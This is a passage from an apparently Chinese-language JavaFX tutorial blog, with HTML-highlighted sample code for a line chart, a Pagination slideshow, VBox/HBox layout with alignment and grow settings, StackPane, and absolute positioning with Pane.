</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NumberAxis</span>(<span class="string">&quot;Voltage (Vs)&quot;</span>, <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.1</span>)  </span><br><span class="line">                );  </span><br><span class="line">  </span><br><span class="line">        lc.getData().add(series);  </span><br><span class="line">  </span><br><span class="line">        lc.setTitle(<span class="string">&quot;RC Charging&quot;</span>);  </span><br><span class="line">        lc.setStyle(<span class="string">&quot;-fx-background-color: lightgray&quot;</span>);  </span><br><span class="line">        lc.setCreateSymbols(<span class="literal">false</span>);  </span><br><span class="line">        lc.setLegendVisible(<span class="literal">false</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>(lc);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setScene(scene);  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;LineChartApp&quot;</span>);  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240430182725.png" alt="20240430182725.png" /></p>
<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>分页是一个UI控件，允许您使用下一个、上一个和直接索引按钮逐步浏览结果块。 Pagination类可以在不需要滚动时拆分长列表。 本节介绍了一个特殊的情况下，单一项目的网页，以形成幻灯片。</p>
<h3 id="SlideShow应用程序"><a href="#SlideShow应用程序" class="headerlink" title="SlideShow应用程序"></a>SlideShow应用程序</h3><p>Pagination控件在屏幕底部呈现自定义节点（一个ImageView）和按钮。     对于三个图像中的每一个，都有一个直接访问按钮1、2和3。 还有一对箭头用于移动到下一个和上一个图像。 标签标记图像索引和图像数量，以补充按钮本身的视觉提示。<br>程序首先定义一个包含三个JavaFX图像的数组：imageURLs。 在start（）方法中，创建了一个引用数组大小的Pagination对象。 提供了一个PageFactory，它基于pageIndex参数创建一个Node。 对于本例，pageIndex是imageURLs数组的索引。<br>程序会形成一个Scene并将其添加到primaryStage。</p>
<h3 id="完整代码-4"><a href="#完整代码-4" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.pagination;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Pagination;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.image.Image;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.image.ImageView;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SlideShowApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Image[] imageURLs = &#123;  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="string">&quot;https://img1.baidu.com/it/u=466865769,2215436347&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=660&amp;h=440&quot;</span>),  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="string">&quot;https://img1.baidu.com/it/u=466865769,2215436347&amp;fm=253&amp;fmt=auto&amp;app=139&amp;f=JPEG?w=660&amp;h=440&quot;</span>),  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="string">&quot;https://img1.baidu.com/it/u=466865769,2215436347&amp;fm=253&amp;fmt=auto&amp;app=1340&amp;f=JPEG?w=660&amp;h=440&quot;</span>)  </span><br><span class="line">    &#125;;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Pagination</span> <span class="variable">pagination</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pagination</span>(imageURLs.length, <span class="number">0</span>);  </span><br><span class="line">        pagination.setPageFactory(  </span><br><span class="line">            pageIndex -&gt; <span class="keyword">new</span> <span class="title class_">ImageView</span>(imageURLs[pageIndex])  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>( pagination );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setScene(scene);  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Pagination类是一个简单的控件，用于遍历一长串项。 这个例子使用了每页一个项目来形成一个幻灯片。 在这两种情况下，这是滚动的替代方法，并且在您希望UI固定在位置时很有用。</p>
<h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><h2 id="VBox和HBox"><a href="#VBox和HBox" class="headerlink" title="VBox和HBox"></a>VBox和HBox</h2><p>JavaFX中的布局从选择正确的容器控件开始。 我最常用的两个布局控件是<code>VBox</code>和<code>HBox</code>。 <code>VBox</code>是一个容器，它将其子容器排列在垂直堆栈中。 <code>HBox</code>将其子元素排列在水平行中。 这两个控件的强大之处在于包装它们并设置几个关键属性：alignment、hgrow和vgrow。<br>本文将通过一个示例项目演示这些控件。 项目的模型显示了一个UI，其中包含以下内容： </p>
<ul>
<li>一行顶部控件，包含刷新Button和注销Hyperlink</li>
<li><code>TableView</code>将增长以占用额外的垂直空间</li>
<li>关闭按钮<br>UI还具有<code>Separator</code>，其将屏幕的顶部与可能成为应用程序的标准下部面板（保存<code>Button</code>、取消<code>Button</code>等）分开。</li>
</ul>
<h3 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h3><p><code>VBox</code>是最外面的容器“vbox”。 这将是提供给场景的<code>Parent</code>。 简单地将UI控件放在这个<code>VBox</code>中将允许控件-最值得注意的是<code>TableView</code>-拉伸以适应可用的水平空间。     最上面的控件，刷新<code>Button</code>和注销<code>Hyperlink</code>，被包装在<code>HBox</code>中。 类似地，我将底部Close <code>Button</code>包装在<code>HBox</code>中，以允许额外的重复。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">btnRefresh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Refresh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HBox</span> <span class="variable">topRightControls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();</span><br><span class="line">topRightControls.getChildren().add( signOutLink );</span><br><span class="line"></span><br><span class="line">topControls.getChildren().addAll( btnRefresh, topRightControls );</span><br><span class="line"></span><br><span class="line">TableView&lt;Customer&gt; tblCustomers = <span class="keyword">new</span> <span class="title class_">TableView</span>&lt;&gt;();</span><br><span class="line"><span class="type">Separator</span> <span class="variable">sep</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Separator</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">HBox</span> <span class="variable">bottomControls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">btnClose</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Close&quot;</span>);</span><br><span class="line"></span><br><span class="line">bottomControls.getChildren().add( btnClose );</span><br><span class="line"></span><br><span class="line">vbox.getChildren().addAll(</span><br><span class="line">        topControls,</span><br><span class="line">        tblCustomers,</span><br><span class="line">        sep,</span><br><span class="line">        bottomControls</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="Alignment-和-Hgrow"><a href="#Alignment-和-Hgrow" class="headerlink" title="Alignment 和 Hgrow"></a>Alignment 和 Hgrow</h3><p>刷新<code>Button</code>向左对齐，而注销<code>Hyperlink</code>向右对齐。 这是使用两个HBox完成的。 topControls是一个包含Refresh <code>HBox</code>的<code>Button</code>，还包含一个带有Sign Out <code>HBox</code>的<code>Hyperlink</code>。 随着屏幕变宽，退出<code>Hyperlink</code>将被拉到右侧，而刷新<code>Button</code>将保持其左对齐。<br>对齐是告知容器将控件定位在何处的属性。 topControls将对齐设置为BOTTOM_LEFT。 topRightControls将对齐设置为BOTTOM_RIGHT。 “BOTTOM”确保文本“Refresh”的基线与文本“Sign Out”的基线匹配。<br>为了使退出<code>Hyperlink</code>在屏幕变宽时向右移动，需要<code>Priority.ALWAYS</code>。 这是一个提示JavaFX扩大topRightControls。 否则，topControls将保留空间，topRightControls将显示在左侧。 注销<code>Hyperlink</code>仍然是右对齐的，但在一个更窄的容器中。<br>请注意，<code>setHgrow()</code>是一个静态方法，既不在topControls <code>HBox</code>上调用，也不在其自身topRightControls上调用。 这是JavaFX API的一个方面，可能会引起混淆，因为大多数API都是通过对象上的setter来设置属性的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">topControls.setAlignment( Pos.BOTTOM_LEFT );</span><br><span class="line"></span><br><span class="line">HBox.setHgrow(topRightControls, Priority.ALWAYS );</span><br><span class="line">topRightControls.setAlignment( Pos.BOTTOM_RIGHT );</span><br></pre></td></tr></table></figure>
<p>关闭按钮被包装在HBox中，并使用BOTTOM_RIGHT优先级定位。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bottomControls.setAlignment(Pos.BOTTOM_RIGHT );</span><br></pre></td></tr></table></figure>
<h3 id="Vgrow"><a href="#Vgrow" class="headerlink" title="Vgrow"></a>Vgrow</h3><p>由于最外面的容器是<code>VBox</code>，所以当窗口变宽时，子容器<code>TableView</code>将扩展以占用额外的水平空间。 但是，垂直移动窗口将在屏幕底部产生间隙。 <code>VBox</code>不会自动调整其任何子项的大小。 与topRightControls<code>HBox</code>一样，可以设置增长指示器。 在<code>HBox</code>的情况下，这是一个水平方向的递归指令setHgrow（）。 对于<code>TableView</code>容器<code>VBox</code>，这将是setVgrow（）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">VBox.setVgrow( tblCustomers, Priority.ALWAYS );</span><br></pre></td></tr></table></figure>
<h3 id="Margin"><a href="#Margin" class="headerlink" title="Margin"></a>Margin</h3><p>有几种方法可以分隔UI控件。 本文在几个容器上使用margin属性在控件周围添加空白。 这些是单独设置的，而不是在<code>VBox</code>上使用间距，以便分隔符将跨越整个宽度。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">VBox.setMargin( topControls, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10.0d</span>) );</span><br><span class="line">VBox.setMargin( tblCustomers, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">0.0d</span>, <span class="number">10.0d</span>, <span class="number">10.0d</span>, <span class="number">10.0d</span>) );</span><br><span class="line">VBox.setMargin( bottomControls, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10.0d</span>) );</span><br></pre></td></tr></table></figure>
<p>tblCustomers使用的<code>Insets</code>省略了任何顶部间距，以保持间距均匀。 JavaFX不像网页设计中那样合并空白。 如果将<code>TableView</code>的顶部Inset设置为10.0d，则顶部控件和<code>TableView</code>之间的距离将是任何其他控件之间距离的两倍。<br>请注意，这些都是静态方法，如<code>Priority</code>。</p>
<h3 id="选择合适的容器"><a href="#选择合适的容器" class="headerlink" title="选择合适的容器"></a>选择合适的容器</h3><p>JavaFX布局的哲学与Swing的哲学相同。 为手头的任务选择合适的容器。 本文介绍了两个最通用的容器：<code>VBox</code>和<code>HBox</code>。 通过设置alignment、hgrow和vgrow等属性，您可以通过嵌套构建极其复杂的布局。 这些是我使用最多的容器，而且通常是我唯一需要的容器。</p>
<h3 id="完整代码-5"><a href="#完整代码-5" class="headerlink" title="完整代码"></a>完整代码</h3><p><code>Customer.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String firstName;  </span><br><span class="line">    <span class="keyword">private</span> String lastName;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">(String firstName,  </span></span><br><span class="line"><span class="params">                    String lastName)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.firstName = firstName;  </span><br><span class="line">        <span class="built_in">this</span>.lastName = lastName;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFirstName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> firstName;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFirstName</span><span class="params">(String firstName)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.firstName = firstName;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLastName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> lastName;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLastName</span><span class="params">(String lastName)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.lastName = lastName;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>VBoxAndHBoxApp.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Pos;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.cell.PropertyValueFactory;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.Priority;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VBoxAndHBoxApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">topControls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();  </span><br><span class="line">        VBox.setMargin( topControls, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10.0d</span>) );  </span><br><span class="line">        topControls.setAlignment( Pos.BOTTOM_LEFT );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">btnRefresh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;刷新&quot;</span>);  </span><br><span class="line">        btnRefresh.setOnAction( e -&gt; &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;点击刷新&quot;</span>);  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">topRightControls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();  </span><br><span class="line">        HBox.setHgrow(topRightControls, Priority.ALWAYS );  </span><br><span class="line">        topRightControls.setAlignment( Pos.BOTTOM_RIGHT );  </span><br><span class="line">        <span class="type">Hyperlink</span> <span class="variable">signOutLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hyperlink</span>(<span class="string">&quot;退出&quot;</span>);  </span><br><span class="line">        signOutLink.setOnAction( e -&gt; &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;点击退出&quot;</span>);  </span><br><span class="line">        &#125;);  </span><br><span class="line">        topRightControls.getChildren().add( signOutLink );  </span><br><span class="line">  </span><br><span class="line">        topControls.getChildren().addAll( btnRefresh, topRightControls );  </span><br><span class="line">  </span><br><span class="line">        TableView&lt;Customer&gt; tblCustomers = <span class="keyword">new</span> <span class="title class_">TableView</span>&lt;&gt;();  </span><br><span class="line">        tblCustomers.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);  </span><br><span class="line">        VBox.setMargin( tblCustomers, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">0.0d</span>, <span class="number">10.0d</span>, <span class="number">10.0d</span>, <span class="number">10.0d</span>) );  </span><br><span class="line">        <span class="comment">// setVgrow可以自动调整Vbox子项的大小,防止大小变动时出现空隙  </span></span><br><span class="line">        VBox.setVgrow( tblCustomers, Priority.ALWAYS );  </span><br><span class="line">  </span><br><span class="line">        TableColumn&lt;Customer, String&gt; lastNameCol = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Last Name&quot;</span>);  </span><br><span class="line">        lastNameCol.setCellValueFactory(<span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;lastName&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        TableColumn&lt;Customer, String&gt; firstNameCol = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;First Name&quot;</span>);  </span><br><span class="line">        firstNameCol.setCellValueFactory(<span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;firstName&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        tblCustomers.getColumns().addAll( lastNameCol, firstNameCol );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Separator</span> <span class="variable">sep</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Separator</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">bottomControls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();  </span><br><span class="line">        bottomControls.setAlignment(Pos.BOTTOM_RIGHT );  </span><br><span class="line">        VBox.setMargin( bottomControls, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10.0d</span>) );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">btnClose</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;关闭&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        btnClose.setOnAction( e -&gt; &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;点击关闭&quot;</span>);  </span><br><span class="line">            System.exit(<span class="number">0</span>);  </span><br><span class="line">        &#125;);  </span><br><span class="line">        bottomControls.getChildren().add( btnClose );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">btnAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;添加&quot;</span>);  </span><br><span class="line">        btnAdd.setOnAction( e -&gt; &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;点击添加&quot;</span>);  </span><br><span class="line">            loadTable(tblCustomers);  </span><br><span class="line">        &#125;);  </span><br><span class="line">        bottomControls.getChildren().add( btnAdd );  </span><br><span class="line">  </span><br><span class="line">        vbox.getChildren().addAll(  </span><br><span class="line">                topControls,  </span><br><span class="line">                tblCustomers,  </span><br><span class="line">                sep,  </span><br><span class="line">                bottomControls  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox );  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.setWidth( <span class="number">800</span> );  </span><br><span class="line">        primaryStage.setHeight( <span class="number">600</span> );  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;VBox and HBox App&quot;</span>);  </span><br><span class="line">        primaryStage.setOnShown( (evt) -&gt; loadTable(tblCustomers) );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">loadTable</span><span class="params">(TableView&lt;Customer&gt; tblCustomers)</span> &#123;  </span><br><span class="line">        tblCustomers.getItems().add(<span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;George&quot;</span>, <span class="string">&quot;Washington&quot;</span>));  </span><br><span class="line">        tblCustomers.getItems().add(<span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;Abe&quot;</span>, <span class="string">&quot;Lincoln&quot;</span>));  </span><br><span class="line">        tblCustomers.getItems().add(<span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;Thomas&quot;</span>, <span class="string">&quot;Jefferson&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240501093804.png" alt="20240501093804.png" /></p>
<h2 id="StackPane"><a href="#StackPane" class="headerlink" title="StackPane"></a>StackPane</h2><p><code>StackPane</code>将它的子项的一个放在另一个上面。最后添加的<code>Node</code>是最高的。默认情况下，<code>StackPane</code>将使用<code>Pos.CENTER</code>对齐子项，如下图所示，其中3个子项（按添加顺序）为：<code>Rectangle</code>、<code>Circle</code>和<code>Button</code>。<br>我们可以通过添加<code>pane.setAlignment(Pos.CENTER_LEFT);</code>来更改默认对齐方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Button;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.StackPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.paint.Color;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Circle;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Rectangle;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StackPaneApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage stage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">hello_button</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Hello StackPane&quot;</span>);  </span><br><span class="line">        hello_button.setOnAction(e -&gt; &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Hello&quot;</span>);  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">StackPane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StackPane</span>(  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>(<span class="number">200</span>, <span class="number">100</span>, Color.BLACK),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="number">40</span>, Color.RED),  </span><br><span class="line">                hello_button  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        stage.setScene(<span class="keyword">new</span> <span class="title class_">Scene</span>(pane, <span class="number">300</span>, <span class="number">300</span>));  </span><br><span class="line">        stage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240501094609.png" alt="20240501094609.png" /></p>
<h2 id="绝对定位（带Pane）"><a href="#绝对定位（带Pane）" class="headerlink" title="绝对定位（带Pane）"></a>绝对定位（带Pane）</h2><p>像<code>VBox</code>或<code>BorderPane</code>这样的容器对齐并分发它们的子节点。 超类<code>Pane</code>也是一个容器，但不对其子类强加顺序。 子元素通过x、centerX和layoutX等属性定位自己。 这被称为绝对定位，它是一种将<code>Shape</code>或<code>Node</code>放置在屏幕上某个位置的技术。</p>
<h3 id="Pane尺寸"><a href="#Pane尺寸" class="headerlink" title="Pane尺寸"></a>Pane尺寸</h3><p>与大多数容器不同，<code>Pane</code>会调整大小以适应其内容，而不是相反。 这张图片是在添加右下角弧之前从风景视图中截取的屏幕截图。 <code>Pane</code>是黄色突出显示的区域。 请注意，它并没有占用整个<code>Stage</code>。<br><img src="/image/Pasted image 20240501105020.png" alt="20240501105020.png" /><br>这是添加右下角<code>Arc</code>后的屏幕截图。 这个<code>Arc</code>被放置在更靠近<code>Stage</code>右下边缘的位置。 这会迫使扩展器拉伸以容纳扩展的内容。<br><img src="/image/Pasted image 20240501105128.png" alt="20240501105128.png" /></p>
<h3 id="The-Pane"><a href="#The-Pane" class="headerlink" title="The Pane"></a>The Pane</h3><p>About View的最外层容器是<code>VBox</code>，其唯一内容是<code>Pane</code>。 <code>VBox</code>用于适应整个<code>Stage</code>并提供背景。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();</span><br><span class="line">vbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>( <span class="number">10</span> ) );</span><br><span class="line">vbox.setBackground(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Background</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BackgroundFill</span>(Color.BLACK, <span class="keyword">new</span> <span class="title class_">CornerRadii</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">0</span>))</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line"><span class="type">Pane</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>();</span><br></pre></td></tr></table></figure>
<h3 id="形状"><a href="#形状" class="headerlink" title="形状"></a>形状</h3><p>在屏幕的左上角，有一组4个“弧”和1个“圆”。 这段代码通过<code>Arc</code>构造函数中的centerX和centerY参数将largeArc定位在（0，0）。 请注意，backgroundArc也位于（0，0）处，并出现在largeArc下面。 <code>Pane</code>并不试图消除重叠形状的冲突，在这种情况下，重叠是想要的。 smArc1位于（0，160），在Y轴上向下。 smArc2位于（160，0）处，正好在X轴上。 smCircle与smArc1和smArc2的距离相同，但角度为45度。</p>
